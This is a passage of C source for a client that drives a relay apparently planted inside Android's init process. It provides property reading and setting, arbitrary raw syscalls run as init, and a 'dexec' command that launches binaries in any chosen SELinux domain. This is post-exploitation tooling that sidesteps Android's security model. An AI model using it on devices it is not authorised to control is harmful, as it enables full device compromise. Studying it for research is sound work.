        fprintf(stderr, "kill: invalid pid: %s\n", argv[pid_idx]);
        return 1;
    }

    /* SAFETY: never signal PID 1 (init) — the relay runs inside init,
     * so killing PID 1 kills the relay and triggers "Attempted to kill init!" */
    if (pid == 1) {
        fprintf(stderr, "kill: refusing to signal PID 1 (init) — this would kill the relay\n");
        return 1;
    }

    int64_t ret = relay_kill(sock, pid, sig);
    if (ret < 0) {
        fprintf(stderr, "kill: (%d) - %s\n", pid, errno_str((int)(-ret)));
        return 1;
    }
    return 0;
}

static int cmd_dexec(int sock, int argc, char *argv[]);

/*
 * getprop/setprop — direct property access via relay syscalls.
 * getprop: parses bionic's binary property area files in /dev/__properties__/
 * setprop: sends PROP_MSG_SETPROP2 to init's property_service socket
 */
#define PROP_AREA_MAGIC   0x504f5250
#define PROP_VALUE_MAX    92
#define PROP_AREA_HDR     128
#define PROP_LONG_FLAG    (1u << 16)
#define PROP_MSG_SETPROP2 0x00020001

/*
 * prop_walk — walk the bionic property trie (prop_bt nodes).
 *
 * The property area file layout:
 *   [0..127]   prop_area header (magic, version, reserved)
 *   [128..]    trie data section — all offsets in prop_bt/prop_info
 *              are relative to byte 128 of the file.
 *
 * prop_bt layout (bionic system_properties.h):
 *   offset 0:  uint32_t namelen        — length of this node's name segment
 *   offset 4:  uint32_t prop           — data-relative offset to prop_info (0 = internal node)
 *   offset 8:  uint32_t left           — data-relative offset to left child prop_bt
 *   offset 12: uint32_t right          — data-relative offset to right child prop_bt
 *   offset 16: uint32_t children       — data-relative offset to first child prop_bt
 *   offset 20: char name[namelen]      — this node's name segment (NOT the full property name)
 *
 * prop_info layout:
 *   offset 0:  uint32_t serial         — serial/version counter
 *   offset 4:  char value[92]          — property value (PROP_VALUE_MAX)
 *   offset 96: char name[0]            — full property name (null-terminated)
 *
 * Long property: if serial has kLongFlag (bit 16) set, the value exceeds 92
 * bytes. The value union then contains a long_property struct: at union
 * offset 56 is uint32_t data_offset, at offset 60 is uint32_t data_length.
 * The actual value bytes are at data[data_offset] in the data section.
 *
 * Name construction: each prop_bt node holds one segment. As we recurse
 * from root through children, we concatenate segments with '.' separators
 * to reconstruct the full dotted property name. The root node's segment
 * has no leading dot.
 *
 * Collected property entry for sorted output.
 */
struct prop_entry {
    char name[256];
    char value[4096];
    char ctx[256];
};

static struct prop_entry *g_props = NULL;
static int g_props_count = 0;
static int g_props_cap = 0;

static void prop_collect(const char *name, int nlen,
                         const char *val, int vlen, const char *ctx) {
    if (g_props_count >= g_props_cap) {
        int newcap = g_props_cap ? g_props_cap * 2 : 512;
        struct prop_entry *tmp = realloc(g_props, (size_t)newcap * sizeof(struct prop_entry));
        if (!tmp) return;
        g_props = tmp;
        g_props_cap = newcap;
    }
    struct prop_entry *e = &g_props[g_props_count++];
    snprintf(e->name, sizeof(e->name), "%.*s", nlen, name);
    snprintf(e->value, sizeof(e->value), "%.*s", vlen, val);
    snprintf(e->ctx, sizeof(e->ctx), "%s", ctx);
}

static int prop_entry_cmp(const void *a, const void *b) {
    return strcmp(((const struct prop_entry *)a)->name,
                 ((const struct prop_entry *)b)->name);
}

/*
 * Parameters:
 *   data     — pointer to byte 128 of the file (start of trie data section)
 *   datasz   — size of the data section (file_size - 128)
 *   off      — data-relative offset of the current prop_bt node
 *   prefix   — accumulated property name prefix from parent nodes
 *   preflen  — length of prefix string
 *   filter   — if non-NULL, only print properties whose name contains this substring
 *   ctx      — property area filename (SELinux context label)
 */
static void prop_walk(const uint8_t *data, uint32_t datasz, uint32_t off,
                      const char *prefix, int preflen,
                      const char *filter, const char *ctx) {
    /* validate offset: need at least 20 bytes for the fixed fields */
    if (off + 20 > datasz) return;

    const uint8_t *n = data + off;
    uint32_t namelen  = *(const uint32_t *)(n + 0);
    uint32_t prop_off = *(const uint32_t *)(n + 4);
    uint32_t left     = *(const uint32_t *)(n + 8);
    uint32_t right    = *(const uint32_t *)(n + 12);
    uint32_t children = *(const uint32_t *)(n + 16);

    /* validate namelen fits within data section */
    if (namelen > 256 || off + 20 + namelen > datasz) return;

    /* build the property name prefix for this node's subtree.
     * Each node's segment is at n+20, length namelen.
     * Prefix = parent_prefix + "." + segment (skip dot for root level). */
    char cur_prefix[512];
    int cur_len = 0;
    const char *seg = (const char *)(n + 20);

    if (namelen > 0) {
        if (preflen > 0) {
            cur_len = snprintf(cur_prefix, sizeof(cur_prefix), "%.*s.%.*s",
                               preflen, prefix, (int)namelen, seg);
        } else {
            cur_len = snprintf(cur_prefix, sizeof(cur_prefix), "%.*s",
                               (int)namelen, seg);
        }
        if (cur_len < 0 || cur_len >= (int)sizeof(cur_prefix))
            return; /* name overflow, skip */
    } else {
        /* namelen == 0: root sentinel node, keep parent prefix */
        if (preflen > 0) {
            cur_len = preflen;
            memcpy(cur_prefix, prefix, preflen);
            cur_prefix[preflen] = '\0';
        } else {
            cur_len = 0;
            cur_prefix[0] = '\0';
        }
    }

    /* visit left subtree (BST order) */
    if (left != 0)
        prop_walk(data, datasz, left, prefix, preflen, filter, ctx);

    /* if this node has a prop_info, extract the property name and value */
    if (prop_off != 0) {
        if (prop_off + 4 + PROP_VALUE_MAX + 1 <= datasz) {
            const uint8_t *pi = data + prop_off;
            uint32_t serial = *(const uint32_t *)(pi + 0);

            const char *pname = (const char *)(pi + 4 + PROP_VALUE_MAX);
            int nlen = (int)strnlen(pname, 256);

            char long_val_buf[4096];
            const char *val = NULL;
            int vlen = 0;

            if (serial & PROP_LONG_FLAG) {
                if (prop_off + 64 + 4 <= datasz) {
                    uint32_t lp_off = *(const uint32_t *)(pi + 60);
                    uint32_t lp_len = *(const uint32_t *)(pi + 64);
                    if (lp_len > 0 && lp_len < sizeof(long_val_buf) &&
                        lp_off + lp_len <= datasz) {
                        memcpy(long_val_buf, data + lp_off, lp_len);
                        long_val_buf[lp_len] = '\0';
                        val = long_val_buf;
                        vlen = (int)lp_len;
                    }
                }
            }

            if (val == NULL) {
                val = (const char *)(pi + 4);
                vlen = (int)strnlen(val, PROP_VALUE_MAX);
            }

            if (nlen > 0 && nlen < 256) {
                if (!filter || strcmp(pname, filter) == 0 || strstr(pname, filter))
                    prop_collect(pname, nlen, val, vlen, ctx);
            }
        }
    }

    /* visit children (next name segment level) */
    if (children != 0)
        prop_walk(data, datasz, children, cur_prefix, cur_len, filter, ctx);

    /* visit right subtree (BST order) */
    if (right != 0)
        prop_walk(data, datasz, right, prefix, preflen, filter, ctx);
}

static int cmd_getprop(int sock, int argc, char *argv[]) {
    const char *filter = NULL;
    int show_ctx = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-Z") == 0)
            show_ctx = 1;
        else
            filter = argv[i];
    }

    g_props = NULL;
    g_props_count = 0;
    g_props_cap = 0;

    int64_t dfd = relay_openat(sock, "/dev/__properties__",
                               MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (dfd < 0) {
        fprintf(stderr, "getprop: cannot open /dev/__properties__\n");
        return 1;
    }

    for (;;) {
        uint8_t dbuf[DATA_SIZE];
        int64_t nb = relay_getdents64(sock, dfd, dbuf, DATA_SIZE);
        if (nb <= 0) break;
        size_t pos = 0;
        while (pos < (size_t)nb) {
            uint16_t reclen = unpack_u32(dbuf + pos + 16) & 0xFFFF;
            const char *dname = (const char *)(dbuf + pos + 19);
            if (reclen == 0) { nb = 0; break; }

            if (dname[0] != '.' && strncmp(dname, "property_info", 13) != 0
                && strncmp(dname, "properties_serial", 17) != 0) {
                char path[512];
                snprintf(path, sizeof(path), "/dev/__properties__/%s", dname);

                uint8_t *rawdata = NULL;
                ssize_t rawsz = relay_read_file(sock, path, &rawdata, 256 * 1024);
                if (rawsz > PROP_AREA_HDR && rawdata) {
                    uint32_t magic = *(uint32_t *)(rawdata + 8);
                    if (magic == PROP_AREA_MAGIC) {
                        uint32_t datasz = (uint32_t)(rawsz - PROP_AREA_HDR);
                        const uint8_t *trie_data = rawdata + PROP_AREA_HDR;
                        prop_walk(trie_data, datasz, 0,
                                  "", 0, filter, dname);
                    }
                }
                if (rawdata) free(rawdata);
            }
            pos += reclen;
        }
        if (nb <= 0) break;
    }
    relay_close(sock, dfd);

    if (g_props_count > 0) {
        qsort(g_props, (size_t)g_props_count, sizeof(struct prop_entry), prop_entry_cmp);
        for (int i = 0; i < g_props_count; i++) {
            if (show_ctx)
                printf("[%s]: [%s]\n", g_props[i].name, g_props[i].ctx);
            else
                printf("[%s]: [%s]\n", g_props[i].name, g_props[i].value);
        }
    }

    if (filter && g_props_count == 0)
        printf("[%s]: (not found)\n", filter);

    free(g_props);
    g_props = NULL;
    g_props_count = 0;
    g_props_cap = 0;
    return 0;
}

static int cmd_setprop(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "setprop: Usage: setprop <name> <value>\n");
        return 1;
    }
    const char *key = argv[1];
    const char *val = argv[2];
    uint32_t klen = (uint32_t)strlen(key);
    uint32_t vlen = (uint32_t)strlen(val);

    int64_t psock = send_syscall(sock, SYS_socket,
        MY_AF_UNIX, 1 /* SOCK_STREAM */, 0, 0, 0, 0, 0, NULL, 0, NULL, 0);
    if (psock < 0) {
        fprintf(stderr, "setprop: socket: %s\n", errno_str((int)-psock));
        return 1;
    }

    /* connect to /dev/socket/property_service */
    uint8_t cpg[PAGE_SIZE];
    memset(cpg, 0, PAGE_SIZE);
    pack_u64(cpg + 0, SYS_connect);
    pack_u64(cpg + 8, (uint64_t)psock);
    pack_u64(cpg + 16, 0);
    static const char ps_path[] = "/dev/socket/property_service";
    pack_u64(cpg + 24, 2 + sizeof(ps_path));
    pack_u32(cpg + 56, FLAG_X1_DATA);
    cpg[DATA_OFFSET] = MY_AF_UNIX;
    cpg[DATA_OFFSET + 1] = 0;
    memcpy(cpg + DATA_OFFSET + 2, ps_path, sizeof(ps_path));

    send_full(sock, cpg, PAGE_SIZE);
    uint8_t crsp[PAGE_SIZE];
    recv_full(sock, crsp, PAGE_SIZE);
    int64_t cret = unpack_i64(crsp);
    if (cret < 0) {
        fprintf(stderr, "setprop: connect: %s\n", errno_str((int)-cret));
        relay_close(sock, psock);
        return 1;
    }

    /* PROP_MSG_SETPROP2: uint32(cmd) + uint32(klen) + key + uint32(vlen) + val */
    uint8_t msg[512];
    int mpos = 0;
    uint32_t cmd_v = PROP_MSG_SETPROP2;
    memcpy(msg + mpos, &cmd_v, 4); mpos += 4;
    memcpy(msg + mpos, &klen, 4); mpos += 4;
    memcpy(msg + mpos, key, klen); mpos += klen;
    memcpy(msg + mpos, &vlen, 4); mpos += 4;
    memcpy(msg + mpos, val, vlen); mpos += vlen;

    relay_write(sock, psock, msg, mpos);

    uint8_t rbuf[4];
    int64_t rn = relay_read(sock, psock, rbuf, 4);
    relay_close(sock, psock);

    if (rn == 4 && *(int32_t *)rbuf == 0) {
        printf("[%s]: [%s]\n", key, val);
    } else {
        fprintf(stderr, "setprop: failed (result=%d)\n",
                rn == 4 ? *(int32_t *)rbuf : -1);
        return 1;
    }
    return 0;
}

static int cmd_raw(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "raw: missing syscall number\nUsage: raw <syscall_nr> [x0 x1 x2 x3 x4 x5]\n");
        return 1;
    }

    uint64_t nr = (uint64_t)strtoull(argv[1], NULL, 0);
    uint64_t x[6] = {0};
    for (int i = 2; i < argc && i < 8; i++) {
        x[i - 2] = (uint64_t)strtoull(argv[i], NULL, 0);
    }

    /* SAFETY: block syscalls that would kill init or the relay */
    if (nr == SYS_exit) {
        fprintf(stderr, "raw: SYS_exit (93) blocked — would exit the relay and kill init\n");
        return 1;
    }
    if (nr == SYS_reboot) {
        fprintf(stderr, "raw: SYS_reboot (142) blocked — use 'reboot' command instead\n");
        return 1;
    }
    if (nr == SYS_kill && (int64_t)x[0] == 1) {
        fprintf(stderr, "raw: SYS_kill with PID 1 blocked — would kill init\n");
        return 1;
    }
    if (nr == SYS_kill && x[0] == 0) {
        fprintf(stderr, "raw: SYS_kill with PID 0 blocked — would signal init's process group\n");
        return 1;
    }

    int64_t ret = send_syscall(sock, nr, x[0], x[1], x[2], x[3], x[4], x[5],
                               0, NULL, 0, NULL, 0);
    printf("retval: %lld (0x%llx)\n", (long long)ret,
           (unsigned long long)(uint64_t)ret);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * dexec — domain-transitioning binary execution via CLONE_VFORK
 *
 * Executes an external binary with argv in an auto-transitioned SELinux
 * domain. Uses setexeccon to explicitly set the target domain before
 * execve — required because the kernel denies raw execve without it.
 *
 * Output capture: the exec'd binary's liblog output goes to logcat
 * naturally. Init writes 🔵 markers to logdw before/after the fork.
 * Client-side logcat captures both. Pipes cannot cross domain
 * boundaries (kernel flush_unauthorized_files replaces them with
 * /dev/null during SELinux transition).
 *
 * CLONE_VFORK protocol:
 *   send(clone)  → recv(0)          [talking to child]
 *   send(execve) → recv(child_pid)  [parent's clone return, talking to parent]
 *   If execve fails:
 *     send(exit, FLAG_EXIT)          [kill child, no recv]
 *     recv(drain)                    [parent's clone return]
 *     [back to parent]
 *
 * References:
 *   AOSP init/service.cpp Service::Start() — fork + setexeccon + execv
 *   kernel security/selinux/hooks.c — flush_unauthorized_files, setexeccon
 *   S23 init symbols: setexeccon@LIBSELINUX_R, fork@LIBC, execv@LIBC
 * ═══════════════════════════════════════════════════════════════════════════ */

static uint64_t discover_data_base(int sock) {
    int64_t fd = relay_openat(sock, "/dev/.dfi_p", MY_O_CREAT | MY_O_RDWR, 0600);
    if (fd < 0) {
        fprintf(stderr, "dexec: probe openat: %s\n", errno_str((int)-fd));
        return 0;
    }
    int64_t db = send_syscall(sock, SYS_lseek,
        (uint64_t)fd, 0, 0, 0, 0, 0,
        FLAG_X1_DATA, NULL, 0, NULL, 0);
    relay_close(sock, fd);
    relay_unlinkat(sock, "/dev/.dfi_p", 0);
    if (db <= 0) {
        fprintf(stderr, "dexec: probe lseek returned %lld\n", (long long)db);
        return 0;
    }
    return (uint64_t)db;
}

static int resolve_exec_context(int sock, const char *binary,
                                char *domain_out, size_t domain_sz,
                                char *context_out, size_t context_sz,
                                int *has_exec_out) {
    char filecon[256];
    memset(filecon, 0, sizeof(filecon));
    int64_t ret = relay_lgetxattr(sock, binary, "security.selinux",
                                  filecon, sizeof(filecon) - 1);
    if (ret <= 0) {
        fprintf(stderr, "dexec: getfilecon(%s): %s\n",
                binary, ret < 0 ? errno_str((int)-ret) : "empty");
        return -1;
    }
    filecon[ret] = '\0';
    /* Strip trailing newline/NUL from xattr */
    while (ret > 0 && (filecon[ret-1] == '\n' || filecon[ret-1] == '\0'))
        filecon[--ret] = '\0';

    /* Parse "u:object_r:toolbox_exec:s0" -> type = "toolbox_exec" */
    int colons = 0;
    const char *type_start = NULL;
    const char *type_end = NULL;
    for (const char *p = filecon; *p; p++) {
        if (*p == ':') {
            colons++;
            if (colons == 2) type_start = p + 1;
            if (colons == 3) { type_end = p; break; }
        }
    }
    if (!type_start || !type_end || type_end <= type_start) {
        fprintf(stderr, "dexec: cannot parse context '%s'\n", filecon);
        return -1;
    }

    char type[128];
    size_t tlen = (size_t)(type_end - type_start);
    if (tlen >= sizeof(type)) tlen = sizeof(type) - 1;
    memcpy(type, type_start, tlen);
    type[tlen] = '\0';

    /* Detect _exec suffix and strip it for domain name */
    char domain[128];
    strncpy(domain, type, sizeof(domain) - 1);
    domain[sizeof(domain) - 1] = '\0';
    size_t dlen = strlen(domain);
    int is_exec = (dlen > 5 && strcmp(domain + dlen - 5, "_exec") == 0);

    if (has_exec_out)
        *has_exec_out = is_exec;

    if (is_exec)
        domain[dlen - 5] = '\0';

    /* Context is ALWAYS u:r:<domain>:s0 — never object_r */
    snprintf(context_out, context_sz, "u:r:%s:s0", domain);
    strncpy(domain_out, domain, domain_sz - 1);
    domain_out[domain_sz - 1] = '\0';
    return 0;
}

/*
 * resolve_binary_path — resolve a bare command name to an absolute path.
 * For domain mode: "sh" -> "/system/bin/sh", etc.
 * Returns 0 on success (out filled with absolute path), -1 if not found.
 */
static int resolve_binary_path(int sock, const char *name,
                               char *out, size_t outsz) {
    /* Already absolute */
    if (name[0] == '/') {
        strncpy(out, name, outsz - 1);
        out[outsz - 1] = '\0';
        return 0;
    }

    static const char *search_dirs[] = {
        "/system/bin",
        "/vendor/bin",
        "/product/bin",
        "/system_ext/bin",
        "/apex/com.android.runtime/bin",
        "/apex/com.android.art/bin",
        "/apex/com.android.adbd/bin",
        "/apex/com.android.os.statsd/bin",
        "/apex/com.android.media/bin",
        "/apex/com.android.tethering/bin",
        "/apex/com.android.media.swcodec/bin",
        NULL
    };

    for (int i = 0; search_dirs[i]; i++) {
        char candidate[CWD_SIZE];
        snprintf(candidate, sizeof(candidate), "%s/%s",
                 search_dirs[i], name);

        uint8_t statbuf[128];
        memset(statbuf, 0, sizeof(statbuf));
        int64_t st = relay_fstatat(sock, candidate, statbuf, sizeof(statbuf));
        if (st < 0)
            continue;

        uint32_t mode = unpack_u32(statbuf + 16);
        /* Must be regular file and executable */
        if ((mode & 0xF000) != 0x8000)
            continue;
        if (!(mode & 0111))
            continue;

        strncpy(out, candidate, outsz - 1);
        out[outsz - 1] = '\0';
        return 0;
    }

    fprintf(stderr, "dexec: command not found: %s\n", name);
    return -1;
}

static int setexeccon_relay(int sock, const char *context) {
    int64_t fd = relay_openat(sock, "/proc/self/attr/exec",
                              MY_O_WRONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "dexec: cannot open /proc/self/attr/exec: %s\n",
                errno_str((int)-fd));
        return -1;
    }
    size_t len = strlen(context);
    int64_t wr;
    if (len > 0) {
        wr = relay_write(sock, fd, context, len + 1);
    } else {
        wr = relay_write(sock, fd, "\n", 1);
    }
    relay_close(sock, fd);

    if (wr < 0) {
        fprintf(stderr, "dexec: setexeccon write failed: %s\n",
                errno_str((int)-wr));
        return -1;
    }

    /* Verify: read back what was actually set */
    if (len > 0) {
        int64_t rfd = relay_openat(sock, "/proc/self/attr/exec", MY_O_RDONLY, 0);
        if (rfd >= 0) {
            char readback[256];
            memset(readback, 0, sizeof(readback));
            int64_t rn = relay_read(sock, rfd, readback, sizeof(readback) - 1);
            relay_close(sock, rfd);
            if (rn > 0) {
                readback[rn] = '\0';
                /* Strip trailing newline */
                while (rn > 0 && (readback[rn-1] == '\n' || readback[rn-1] == '\0'))
                    readback[--rn] = '\0';
                if (strcmp(readback, context) != 0)
                    fprintf(stderr, "dexec: WARNING: setexeccon mismatch!\n"
                            "  wanted: '%s'\n  actual: '%s'\n", context, readback);
            } else {
                fprintf(stderr, "dexec: WARNING: /proc/self/attr/exec is empty after write\n");
            }
        }
    }
    return 0;
}

static int64_t logdw_open(int sock) {
    int64_t lfd = send_syscall(sock, SYS_socket,
        MY_AF_UNIX, MY_SOCK_DGRAM, 0, 0, 0, 0, 0, NULL, 0, NULL, 0);
    if (lfd < 0) return lfd;

    static const char ldw_path[] = "/dev/socket/logdw";
    uint8_t cpg[PAGE_SIZE];
    memset(cpg, 0, PAGE_SIZE);
    pack_u64(cpg + 0,  SYS_connect);
    pack_u64(cpg + 8,  (uint64_t)lfd);
    pack_u64(cpg + 16, 0);
    pack_u64(cpg + 24, (uint64_t)(2 + sizeof(ldw_path)));
    pack_u32(cpg + 56, FLAG_X1_DATA);
    cpg[DATA_OFFSET] = MY_AF_UNIX;
    cpg[DATA_OFFSET + 1] = 0;
    memcpy(cpg + DATA_OFFSET + 2, ldw_path, sizeof(ldw_path));

    send_full(sock, cpg, PAGE_SIZE);
    uint8_t crsp[PAGE_SIZE];
    recv_full(sock, crsp, PAGE_SIZE);
    int64_t cret = unpack_i64(crsp);
    if (cret < 0) {
        relay_close(sock, lfd);
        return cret;
    }
    return lfd;
}

static int logdw_write_marker(int sock, int64_t lfd, const char *message) {
    if (lfd < 0) return -1;

    uint8_t ts_buf[16];
    int64_t tr = send_syscall(sock, SYS_clock_gettime,
        MY_CLOCK_REALTIME, 0, 0, 0, 0, 0,
        FLAG_X1_DATA, NULL, 0, ts_buf, 16);
    uint32_t tv_sec = 0, tv_nsec = 0;
    if (tr >= 0) {
        tv_sec  = (uint32_t)(unpack_i64(ts_buf) & 0xFFFFFFFF);
        tv_nsec = (uint32_t)(unpack_i64(ts_buf + 8) & 0xFFFFFFFF);
    }

    static const char tag[] = "DirtyInit";
    size_t mlen = strlen(message);
    size_t entry_len = 11 + 1 + sizeof(tag) + mlen + 1;
    if (entry_len > DATA_SIZE) return -1;

    uint8_t entry[DATA_SIZE];
    memset(entry, 0, entry_len);
    int off = 0;
    entry[off++] = 0;                               /* log_id = LOG_ID_MAIN */
    entry[off++] = 0; entry[off++] = 0;             /* tid (unused for marker) */
    pack_u32(entry + off, tv_sec);  off += 4;        /* tv_sec */
    pack_u32(entry + off, tv_nsec); off += 4;        /* tv_nsec */
    entry[off++] = 4;                                /* priority = INFO */
    memcpy(entry + off, tag, sizeof(tag)); off += sizeof(tag); /* tag + NUL */
    memcpy(entry + off, message, mlen + 1); off += mlen + 1;  /* msg + NUL */

    relay_write(sock, lfd, entry, (size_t)off);
    return 0;
}

static int cmd_dexec(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr,
            "dexec -- domain-transitioning exec from init  ***EXPERIMENTAL***\n"
            "\n"
            "Usage:\n"
            "  dexec <binary> [args...]                 Auto-detect domain from file label\n"
            "  dexec -d <domain|path> <binary> [args...]  Explicit domain override\n"
            "  /absolute/path [args...]                 Shorthand for dexec <path>\n"
            "\n"
            "Arguments:\n"
            "  -d <domain>    SELinux domain: short name, full context, or binary path\n"
            "  <binary>       Absolute path to executable (must be valid entrypoint)\n"
            "  [args...]      Arguments passed to the exec'd binary\n"
        );
        return 1;
    }

    /* ── Phase -1: Defensive clear of stale exec context ───────────── */
    /* A previous failed dexec may have left a domain in
     * /proc/self/attr/exec. Clear it unconditionally at entry so that
     * auto-mode domain detection is never polluted by prior calls. */
    setexeccon_relay(sock, "");

    /* ── Phase 0: Parse -d/--domain flag ────────────────────────────── */
    const char *explicit_domain = NULL;
    int cmd_start = 1;  /* index into argv where the command starts */

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--domain") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "dexec: %s requires a domain argument\n", argv[i]);
                return 1;
            }
            explicit_domain = argv[i + 1];
            cmd_start = i + 2;
            break;
        }
        if (strncmp(argv[i], "--domain=", 9) == 0) {
            explicit_domain = argv[i] + 9;
            /* Strip surrounding quotes from --domain="value" */
            size_t edl = strlen(explicit_domain);
            if (edl >= 2 &&
                ((explicit_domain[0] == '"' && explicit_domain[edl-1] == '"') ||
                 (explicit_domain[0] == '\'' && explicit_domain[edl-1] == '\''))) {
                ((char *)explicit_domain)[edl-1] = '\0';
                explicit_domain++;
            }
            if (*explicit_domain == '\0') {
                fprintf(stderr, "dexec: --domain= requires a value\n");
                return 1;
            }
            cmd_start = i + 1;
            break;
        }
        /* First non-flag argument: stop scanning */
        if (argv[i][0] != '-')
            break;
    }

    if (cmd_start >= argc && explicit_domain) {
        fprintf(stderr, "dexec: no command specified after domain\n");
        return 1;
    }
    if (cmd_start >= argc) {
        fprintf(stderr, "dexec: no binary specified\n");
        return 1;
    }

    /* ── Phase 1: Determine mode, resolve domain + exec binary ──── */
    char domain[128];
    char context[256];
    char exec_binary_buf[CWD_SIZE];
    const char *exec_binary = NULL;
    int exec_argv_start = 0;  /* index into argv for the process's argv[0] */

    if (explicit_domain) {
        /* ── MODE A: explicit domain ───────────────────────────────── */
        if (strchr(explicit_domain, ':')) {
            /* Full context string, e.g. "u:r:installd:s0" or "u:object_r:installd:s0" */
            char ctx_copy[256];
            strncpy(ctx_copy, explicit_domain, sizeof(ctx_copy) - 1);
            ctx_copy[sizeof(ctx_copy) - 1] = '\0';

            /* Fix object_r -> r (object_r is for files, not processes) */
            char *objr = strstr(ctx_copy, ":object_r:");
            if (objr) {
                /* "u:object_r:foo:s0" -> "u:r:foo:s0" */
                char fixed[256];
                size_t prefix_len = (size_t)(objr - ctx_copy);
                memcpy(fixed, ctx_copy, prefix_len);
                fixed[prefix_len] = '\0';
                strncat(fixed, ":r:", sizeof(fixed) - strlen(fixed) - 1);
                strncat(fixed, objr + 10, sizeof(fixed) - strlen(fixed) - 1);
                strncpy(ctx_copy, fixed, sizeof(ctx_copy) - 1);
                ctx_copy[sizeof(ctx_copy) - 1] = '\0';
            }

            strncpy(context, ctx_copy, sizeof(context) - 1);
            context[sizeof(context) - 1] = '\0';

            /* Extract domain name = 3rd colon-delimited field */
            int colons = 0;
            const char *ds = NULL;
            const char *de = NULL;
            for (const char *p = context; *p; p++) {
                if (*p == ':') {
                    colons++;
                    if (colons == 2) ds = p + 1;
                    if (colons == 3) { de = p; break; }
                }
            }
            if (ds && de && de > ds) {
                size_t dlen = (size_t)(de - ds);
                if (dlen >= sizeof(domain)) dlen = sizeof(domain) - 1;
                memcpy(domain, ds, dlen);
                domain[dlen] = '\0';
            } else {
                fprintf(stderr, "dexec: cannot parse domain from context '%s'\n",
                        explicit_domain);
                return 1;
            }
        } else if (strchr(explicit_domain, '/')) {
            /* ── Path-as-domain: -d /vendor/bin/qseecomd ────────────── */
            /* Resolve the path, read its file label, derive domain */
            char path_abs[CWD_SIZE];
            resolve_path(explicit_domain, path_abs);

            /* Validate the reference binary exists */
            uint8_t sb[128];
            memset(sb, 0, sizeof(sb));
            int64_t st = relay_fstatat(sock, path_abs, sb, sizeof(sb));
            if (st < 0) {
                fprintf(stderr, "dexec: %s: %s\n",
                        path_abs, errno_str((int)(-st)));
                return 1;
            }
            uint32_t md = unpack_u32(sb + 16);
            if ((md & 0xF000) != 0x8000) {
                fprintf(stderr, "dexec: %s: not a regular file (mode=0%o)\n",
                        path_abs, md);
                return 1;
            }
            if (!(md & 0111)) {
                fprintf(stderr, "dexec: %s: not executable (mode=0%o)\n",
                        path_abs, md);
                return 1;
            }

            int has_exec = 0;
            if (resolve_exec_context(sock, path_abs, domain, sizeof(domain),
                                     context, sizeof(context), &has_exec) < 0)
                return 1;

            if (!has_exec)
                fprintf(stderr,
                    "dexec: warning: %s has no _exec label (%s)\n",
                    path_abs, context);

            fprintf(stderr, "dexec: -d %s -> domain=%s (%s)\n",
                    explicit_domain, domain, context);
        } else {
            /* Short name, e.g. "installd" */
            strncpy(domain, explicit_domain, sizeof(domain) - 1);
            domain[sizeof(domain) - 1] = '\0';
            snprintf(context, sizeof(context), "u:r:%s:s0", domain);
        }

        /* Resolve the command binary */
        if (resolve_binary_path(sock, argv[cmd_start],
                                exec_binary_buf, sizeof(exec_binary_buf)) < 0)
            return 1;
        exec_binary = exec_binary_buf;
        exec_argv_start = cmd_start;
    } else {
        /* ── AUTO MODE: derive from file label ─────────────────────── */
        const char *binary_ref = argv[1];
        char abs[CWD_SIZE];
        resolve_path(binary_ref, abs);

        /* Validate the reference binary exists */
        uint8_t statbuf[128];
        memset(statbuf, 0, sizeof(statbuf));
        int64_t st = relay_fstatat(sock, abs, statbuf, sizeof(statbuf));
        if (st < 0) {
            fprintf(stderr, "dexec: %s: %s\n", abs, errno_str((int)(-st)));
            return 1;
        }
        uint32_t mode = unpack_u32(statbuf + 16);
        if ((mode & 0xF000) != 0x8000) {
            fprintf(stderr, "dexec: %s: not a regular file (mode=0%o)\n",
                    abs, mode);
            return 1;
        }
        if (!(mode & 0111)) {
            fprintf(stderr, "dexec: %s: not executable (mode=0%o)\n",
                    abs, mode);
            return 1;
        }

        int has_exec = 0;
        if (resolve_exec_context(sock, abs, domain, sizeof(domain),
                                 context, sizeof(context), &has_exec) < 0)
            return 1;

        if (has_exec && argc > 2) {
            /* ── MODE B: _exec label + extra args -> domain mode ──── */
            /* binary_ref is the domain reference, not what we exec.
             * argv[2..] is the actual command to run. */
            if (resolve_binary_path(sock, argv[2],
                                    exec_binary_buf, sizeof(exec_binary_buf)) < 0)
                return 1;
            exec_binary = exec_binary_buf;
            exec_argv_start = 2;
        } else {
            /* ── MODE C: _exec label, no extra args -> exec itself
             * ── MODE D: no _exec label -> binary mode (exec with all args) */
            strncpy(exec_binary_buf, abs, sizeof(exec_binary_buf) - 1);
            exec_binary_buf[sizeof(exec_binary_buf) - 1] = '\0';
            exec_binary = exec_binary_buf;
            exec_argv_start = 1;
        }
    }

    /* ── Phase 2: Validate exec binary ─────────────────────────────── */
    {
        uint8_t statbuf[128];
        memset(statbuf, 0, sizeof(statbuf));
        int64_t st = relay_fstatat(sock, exec_binary, statbuf, sizeof(statbuf));
        if (st < 0) {
            fprintf(stderr, "dexec: %s: %s\n", exec_binary,
                    errno_str((int)(-st)));
            return 1;
        }
        uint32_t mode = unpack_u32(statbuf + 16);
        if ((mode & 0xF000) != 0x8000) {
            fprintf(stderr, "dexec: %s: not a regular file (mode=0%o)\n",
                    exec_binary, mode);
            return 1;
        }
        if (!(mode & 0111)) {
            fprintf(stderr, "dexec: %s: not executable (mode=0%o)\n",
                    exec_binary, mode);
            return 1;
        }
    }

    /* ── Phase 3: Execute (same protocol as before) ────────────────── */
    printf("[*] dexec: %s -> %s\n", exec_binary, context);

    /* Discover data_base for argv pointer construction */
    uint64_t data_base = discover_data_base(sock);
    if (data_base == 0) return 1;

    int ret = 1;
    int64_t logdw_fd = -1;
    int execcon_set = 0;
    pid_t logcat_pid = 0;
    int64_t child_pid = 0;

    /* Set exec context (required -- without this, execve returns EACCES) */
    if (setexeccon_relay(sock, context) < 0) {
        fprintf(stderr, "dexec: setexeccon failed\n");
        goto cleanup;
    }
    execcon_set = 1;

    /* Open logdw for markers (non-fatal if it fails) */
    logdw_fd = logdw_open(sock);
    if (logdw_fd < 0)
        fprintf(stderr, "dexec: logdw open failed (markers disabled)\n");

